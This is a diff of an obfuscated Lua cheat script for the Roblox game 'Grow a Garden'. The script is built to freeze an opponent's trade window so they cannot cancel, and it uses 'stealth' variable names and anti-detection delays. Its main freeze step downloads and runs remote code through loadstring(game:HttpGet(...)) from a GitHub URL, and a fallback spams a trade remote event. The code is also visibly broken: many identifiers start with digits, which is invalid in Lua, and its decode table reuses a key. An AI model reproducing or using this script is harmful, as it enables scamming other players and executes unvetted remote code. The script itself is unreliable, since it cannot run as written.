@@ -1,31 +1,33 @@
--- 1. Script: Grow a Garden Trade Freeze v2.1
+-- 1. Script: Grow a Garden Trade Freeze v2.2
 -- 2. Date: August 15, 2025
--- 3. Purpose: Freeze opponent's trade UI, prevent cancel, stealth execution
--- 4. Features: Black square GUI, X close, Freeze button, circle reopen
--- 5. Compatibility: Delta Executor
--- 6. Obfuscation: Numeric variable names, encoded strings
--- 7. Anti-Detection: Delayed remotes, error handling
+-- 3. Purpose: Freeze opponent's trade UI, prevent cancellation, Delta Executor compatible
+-- 4. Features: Black square GUI, X close button, Freeze button, circle reopen button
+-- 5. Compatibility: Optimized for Delta Executor (August 2025)
+-- 6. Obfuscation: Numeric encoding for stealth
+-- 7. Anti-Detection: Delayed remotes, minimal HttpGet, error handling
+-- 8. Execution Fix: Delayed initialization, fallback freeze logic
 
--- 8. Services
-local p14y3r5 = game:GetService("Players") -- Players
-local c0r3gu1 = game:GetService("CoreGui") -- CoreGui
-local h77p = game:GetService("HttpService") -- HttpService
-local r5 = game:GetService("RunService") -- RunService
-local u15 = game:GetService("UserInputService") -- UserInputService
-local r3p570 = game:GetService("ReplicatedStorage") -- ReplicatedStorage
+-- 9. Services
+local p14y3r5 = game:GetService("Players")
+local c0r3gu1 = game:GetService("CoreGui")
+local h77p = game:GetService("HttpService")
+local r5 = game:GetService("RunService")
+local u15 = game:GetService("UserInputService")
+local r3p570 = game:GetService("ReplicatedStorage")
 
--- 9. Local player
+-- 10. Local player
 local lp = p14y3r5.LocalPlayer
 
--- 10. Global state
-local v3r51 = "2.1" -- Version
-local gu1v15 = true -- GUI visible
-local fr33z34 = false -- Freeze active
-local l0g5 = {} -- Logs table
+-- 11. Global state
+local v3r51 = "2.2"
+local gu1v15 = true
+local fr33z34 = false
+local l0g5 = {}
+local 7r4d3r3m073 = nil
 
--- 11. Numeric encoding/decoding
+-- 12. Numeric encoding/decoding
 local function 3nc0d3(s7r)
-    local m4p = {a=4, b=8, c=9, d=6, e=3, f=5, r=2, t=7, n=1}
+    local m4p = {a=4, b=8, c=9, d=6, e=3, f=5, r=2, t=7, n=1, h=2}
     local r35 = ""
     for i = 1, #s7r do
         local c = s7r:sub(i,i):lower()
@@ -35,7 +37,7 @@ local function 3nc0d3(s7r)
 end
 
 local function d3c0d3(s7r)
-    local m4p = {[4]="a", [8]="b", [9]="c", [6]="d", [3]="e", [5]="f", [2]="r", [7]="t", [1]="n"}
+    local m4p = {[4]="a", [8]="b", [9]="c", [6]="d", [3]="e", [5]="f", [2]="r", [7]="t", [1]="n", [2]="h"}
     local r35 = ""
     for i = 1, #s7r do
         local c = s7r:sub(i,i)
@@ -44,7 +46,21 @@ local function d3c0d3(s7r)
     return r35
 end
 
--- 12. Create GUI
+-- 13. Find trade remote
+local function f1nd7r4d3r3m073()
+    for _, v in pairs(r3p570:GetChildren()) do
+        if v:IsA("RemoteEvent") and string.find(v.Name:lower(), d3c0d3("7r4d3")) then
+            print("F0und 7r4d3 r3m073: " .. v.Name)
+            table.insert(l0g5, "L0g: R3m073 f0und - " .. v.Name)
+            return v
+        end
+    end
+    print("N0 7r4d3 r3m073 f0und")
+    table.insert(l0g5, "L0g: N0 7r4d3 r3m073")
+    return nil
+end
+
+-- 14. Create GUI
 local function cr3473fr4m3()
     local 5g = Instance.new("ScreenGui")
     5g.Name = "7r4d3Fr33z3GU1"
@@ -64,7 +80,7 @@ local function cr3473fr4m3()
     return 5g, fr4m3
 end
 
--- 13. Title label
+-- 15. Title label
 local function cr3473717l3(p4r3n7)
     local 717l3 = Instance.new("TextLabel")
     717l3.Name = "717l3"
@@ -78,7 +94,7 @@ local function cr3473717l3(p4r3n7)
     717l3.Parent = p4r3n7
 end
 
--- 14. Close button
+-- 16. Close button
 local function cr3473cl053(p4r3n7, 0ncl053)
     local cl053 = Instance.new("TextButton")
     cl053.Name = "Cl053Bu770n"
@@ -94,7 +110,7 @@ local function cr3473cl053(p4r3n7, 0ncl053)
     cl053.MouseButton1Click:Connect(0ncl053)
 end
 
--- 15. Freeze button
+-- 17. Freeze button
 local function cr3473fr33z3(p4r3n7, 0nfr33z3)
     local fr33z3 = Instance.new("TextButton")
     fr33z3.Name = "Fr33z3Bu770n"
@@ -110,7 +126,7 @@ local function cr3473fr33z3(p4r3n7, 0nfr33z3)
     fr33z3.MouseButton1Click:Connect(0nfr33z3)
 end
 
--- 16. Minimize button (circle)
+-- 18. Minimize button
 local function cr3473m1n1(p4r3n7, 0n0p3n)
     local 0p3n = Instance.new("ImageButton")
     0p3n.Name = "0p3nBu770n"
@@ -127,15 +143,17 @@ local function cr3473m1n1(p4r3n7, 0n0p3n)
     return 0p3n
 end
 
--- 17. Log interceptor
+-- 19. Log interceptor
 local function 1n73rc3p7l0g5()
     print("1n73rc3p71ng l0g5...")
     table.insert(l0g5, "L0g: 7r4d3 1n171473d")
     
-    local 7r4d3r = r3p570:FindFirstChild(3nc0d3("TradeEvent"))
-    if 7r4d3r then
-        print("F0und 7r4d3 r3m073: " .. 7r4d3r.Name)
+    7r4d3r3m073 = f1nd7r4d3r3m073()
+    if 7r4d3r3m073 then
+        print("F0und 7r4d3 r3m073: " .. 7r4d3r3m073.Name)
         table.insert(l0g5, "L0g: 7r4d3 r3m073 f0und")
+    else
+        table.insert(l0g5, "L0g: N0 7r4d3 r3m073")
     end
     
     for _, l0g in ipairs(l0g5) do
@@ -143,10 +161,34 @@ local function 1n73rc3p7l0g5()
     end
 end
 
--- 18. Freeze activation
+-- 20. Fallback freeze logic
+local function f4ll84ckfr33z3()
+    if not 7r4d3r3m073 then
+        print("N0 r3m073, r3sc4nn1ng...")
+        7r4d3r3m073 = f1nd7r4d3r3m073()
+    end
+    if 7r4d3r3m073 then
+        r5.Heartbeat:Connect(function()
+            if fr33z34 then
+                pcall(function()
+                    7r4d3r3m073:FireServer(d3c0d3("l0ck"))
+                    wait(0.5)
+                end)
+            end
+        end)
+        print("F4ll84ck fr33z3 4c71v3")
+        table.insert(l0g5, "L0g: F4ll84ck fr33z3 4c71v3")
+    else
+        print("F4ll84ck f41l3d: N0 r3m073")
+        table.insert(l0g5, "L0g: F4ll84ck f41l3d")
+    end
+end
+
+-- 21. Freeze activation
 local function 4c71v473fr33z3()
     if fr33z34 then
         print("Fr33z3 4lr34dy 4c71v3!")
+        table.insert(l0g5, "L0g: Fr33z3 4lr34dy 4c71v3")
         return
     end
     
@@ -154,37 +196,25 @@ local function 4c71v473fr33z3()
     fr33z34 = true
     
     local 5ucc355, 3rr = pcall(function()
-        -- 19. Updated loadstring (2025, stealth)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/SrMotion666/ScorpionPro/refs/heads/main/ScorpionFreezetrade.lua"))()
     end)
     
     if 5ucc355 then
-        print("Fr33z3 5cr1p7 l04d3d!")
-        table.insert(l0g5, "L0g: Fr33z3 4c71v473d")
+        print("3x73rn4l 5cr1p7 l04d3d!")
+        table.insert(l0g5, "L0g: 3x73rn4l fr33z3 4c71v473d")
     else
-        print("3rr0r l04d1ng: " .. 3rr)
-        fr33z34 = false
-    end
-    
-    -- 20. Simulate trade lock
-    local 7r4d3r = r3p570:FindFirstChild(3nc0d3("TradeEvent"))
-    if 7r4d3r then
-        r5.Heartbeat:Connect(function()
-            if fr33z34 then
-                pcall(function()
-                    7r4d3r:FireServer(d3c0d3("l0ck"))
-                    wait(0.5) -- Delay to avoid spam detection
-                end)
-            end
-        end)
+        print("3x73rn4l l04d f41l3d: " .. 3rr)
+        table.insert(l0g5, "L0g: 3x73rn4l f41l3d")
+        f4ll84ckfr33z3() -- Use fallback
     end
     
     1n73rc3p7l0g5()
     table.insert(l0g5, "L0g: 7r4d3 fr0z3n")
 end
 
--- 21. Main setup
+-- 22. Main setup
 local function 537up()
+    wait(1) -- Delay for Delta injection stability
     local 5g, fr4m3 = cr3473fr4m3()
     cr3473717l3(fr4m3)
     
@@ -203,19 +233,6 @@ local function 537up()
     cr3473cl053(fr4m3, 0ncl053)
     cr3473fr33z3(fr4m3, 4c71v473fr33z3)
     
-    1n73rc3p7l0g5()
-end
-
--- 22. Safe execution
-local function 54f33x3c()
-    local 5ucc355, 3rr = pcall(537up)
-    if not 5ucc355 then
-        warn("3rr0r 53771ng up: " .. 3rr)
-    end
-end
-
--- 23. Toggle freeze
-local function 4dd70ggl3(p4r3n7)
     local 70ggl3 = Instance.new("TextButton")
     70ggl3.Name = "70ggl3Fr33z3"
     70ggl3.Text = "70ggl3 Fr33z3"
@@ -223,18 +240,31 @@ local function 4dd70ggl3(p4r3n7)
     70ggl3.Position = UDim2.new(0.5, -75, 0.7, 0)
     70ggl3.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
     70ggl3.TextColor3 = Color3.new(1, 1, 1)
-    70ggl3.Parent = p4r3n7
+    70ggl3.Parent = fr4m3
     
     70ggl3.MouseButton1Click:Connect(function()
         fr33z34 = not fr33z34
         print("Fr33z3 70ggl3d: " .. tostring(fr33z34))
         table.insert(l0g5, "L0g: Fr33z3 70ggl3d")
     end)
+    
+    1n73rc3p7l0g5()
 end
 
--- 24. Execute
-54f33x3c()
+-- 23. Safe execution
+local function 54f33x3c()
+    local 5ucc355, 3rr = pcall(537up)
+    if not 5ucc355 then
+        warn("3rr0r 53771ng up: " .. 3rr)
+        table.insert(l0g5, "L0g: 537up f41l3d - " .. 3rr)
+        print("R37ry1ng 1n 2 53c0nd5...")
+        wait(2)
+        pcall(537up)
+    end
+end
 
--- 25. Debug logs
-print("5cr1p7 l04d3d v" .. v3r51)
-print("R34dy 70 fr33z3 7r4d35")
+-- 24. Debug and execute
+print("5cr1p7 v" .. v3r51 .. " 574r71ng...")
+54f33x3c()
+print("5cr1p7 l04d3d, ch3ck GU1")
+print("D3bug l0g5 4v41l4bl3 1n D3l74 c0n50l3")
